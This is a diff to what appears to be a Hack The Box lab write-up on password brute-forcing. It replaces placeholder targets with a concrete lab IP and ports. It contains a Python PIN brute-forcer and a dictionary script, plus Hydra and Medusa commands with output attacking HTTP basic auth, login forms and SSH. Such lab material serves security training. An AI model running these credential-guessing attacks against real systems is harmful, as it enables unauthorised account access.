@@ -115,8 +115,8 @@ The lab exposes a `/pin` endpoint accepting a 4-digit PIN as a query parameter. 
 ```python
 import requests
 
-ip = "10.129.x.x"   # target IP
-port = 1234          # target port
+ip = "10.129.85.14"  # target IP
+port = 1234           # target port
 
 for pin in range(10000):
     formatted_pin = f"{pin:04d}"
@@ -173,7 +173,7 @@ Humans prioritize memorable passwords over secure ones — dictionary words, nam
 ```python
 import requests
 
-ip = "10.129.x.x"
+ip = "10.129.85.14"
 port = 1234
 
 passwords = requests.get(
@@ -323,12 +323,12 @@ Target: known username `basic-auth-user`, unknown password.
 Hackerpatel007_1@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
 
 # Hydra attack
-Hackerpatel007_1@htb[/htb]$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 10.129.x.x http-get / -s 81
+Hackerpatel007_1@htb[/htb]$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 10.129.85.14 http-get / -s 81
 
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
-[DATA] attacking http-get://10.129.x.x:81/
-[81][http-get] host: 10.129.x.x   login: basic-auth-user   password: [redacted]
+[DATA] attacking http-get://10.129.85.14:81/
+[81][http-get] host: 10.129.85.14   login: basic-auth-user   password: [redacted]
 1 of 1 target successfully completed, 1 valid password found
 ```
 
@@ -409,13 +409,13 @@ Hackerpatel007_1@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielm
 Hackerpatel007_1@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
 
 # Hydra attack
-Hackerpatel007_1@htb[/htb]$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 10.129.x.x -s PORT http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
+Hackerpatel007_1@htb[/htb]$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f 10.129.85.14 -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
 
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 3400 login tries (l:17/p:200), ~213 tries per task
-[DATA] attacking http-post-form://10.129.x.x:PORT/:username=^USER^&password=^PASS^:F=Invalid credentials
-[PORT][http-post-form] host: 10.129.x.x   login: [redacted]   password: [redacted]
-[STATUS] attack finished for 10.129.x.x (valid pair found)
+[DATA] attacking http-post-form://10.129.85.14:5000/:username=^USER^&password=^PASS^:F=Invalid credentials
+[5000][http-post-form] host: 10.129.85.14   login: [redacted]   password: [redacted]
+[STATUS] attack finished for 10.129.85.14 (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
 ```
 
@@ -479,11 +479,11 @@ Two-stage attack: brute-force SSH → pivot inside box → discover FTP → brut
 Known username: `sshuser`
 
 ```shell-session
-Hackerpatel007_1@htb[/htb]$ medusa -h 10.129.x.x -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
+Hackerpatel007_1@htb[/htb]$ medusa -h 10.129.85.14 -n 22 -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
 
 Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks
 ...
-ACCOUNT FOUND: [ssh] Host: 10.129.x.x User: sshuser Password: [redacted] [SUCCESS]
+ACCOUNT FOUND: [ssh] Host: 10.129.85.14 User: sshuser Password: [redacted] [SUCCESS]
 ```
 
 **Parameters:**
@@ -496,7 +496,7 @@ ACCOUNT FOUND: [ssh] Host: 10.129.x.x User: sshuser Password: [redacted] [SUCCES
 ### Stage 2 — Connect via SSH
 
 ```shell-session
-Hackerpatel007_1@htb[/htb]$ ssh sshuser@10.129.x.x -p PORT
+Hackerpatel007_1@htb[/htb]$ ssh sshuser@10.129.85.14 -p 22
 ```
 
 ### Stage 3 — Internal Reconnaissance
@@ -612,13 +612,13 @@ Reduces ~46,000 → ~7,900 passwords that actually match the policy.
 ### Full Attack — Custom Lists + Hydra
 
 ```shell-session
-Hackerpatel007_1@htb[/htb]$ hydra -L jane_smith_usernames.txt -P jane-filtered.txt 10.129.x.x -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
+Hackerpatel007_1@htb[/htb]$ hydra -L jane_smith_usernames.txt -P jane-filtered.txt 10.129.85.14 -s 5000 -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
 
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 655060 login tries (l:14/p:46790)
-[DATA] attacking http-post-form://10.129.x.x:PORT/:username=^USER^&password=^PASS^:Invalid credentials
-[PORT][http-post-form] host: 10.129.x.x   login: [redacted]   password: [redacted]
-[STATUS] attack finished for 10.129.x.x (valid pair found)
+[DATA] attacking http-post-form://10.129.85.14:5000/:username=^USER^&password=^PASS^:Invalid credentials
+[5000][http-post-form] host: 10.129.85.14   login: [redacted]   password: [redacted]
+[STATUS] attack finished for 10.129.85.14 (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
 ```
 
